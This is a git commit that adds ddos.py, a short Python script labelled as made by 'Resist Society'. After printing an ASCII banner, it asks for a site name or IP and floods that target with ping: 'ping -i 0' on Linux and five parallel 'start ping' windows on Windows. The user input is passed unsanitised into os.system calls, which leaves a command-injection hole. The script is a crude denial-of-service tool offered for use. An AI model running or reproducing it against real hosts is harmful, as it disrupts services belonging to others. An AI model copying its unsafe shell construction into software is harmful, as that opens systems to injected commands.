bec3baf37c75d10b9d2925ecd4f895763d6d46f2
resist12 <88823387+resist12@users.noreply.github.com>
2021-11-04 18:00:35 +0100

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,28 @@
+print(print("\033[1;32;40m Bright Green  \n"))
+print(""""____________________________________________________________________________________________________
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]\n
+___T-H-I-S  S-C-R-I-P-T  M-A-D-E  B-Y  R-E-S-I-S-T  S-O-C-I-E-T-Y___
+\n[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+[[[[[[[[[[[[[[[[[[[[Reists]]]]]]]]]]]]]]]]]]]]]]]]]]
+____________________________________________________________________________________________________""")
+print("""
+""")
+import os
+from platform import system
+if system() == 'Linux':
+    pop = input('Hey Linux User-----input site name or  ip\n>')
+    os.system(f'ping -i 0 {pop}')
+if system() == 'Windows':
+    a = input(f'Hey Windows User-----input site name or  ip\n>')
+    os.system(f'start ping {a} -t100')
+    os.system(f'start ping {a} -t100')
+    os.system(f'start ping {a} -t100')
+    os.system(f'start ping {a} -t100')
+    os.system(f'start ping {a} -t100')
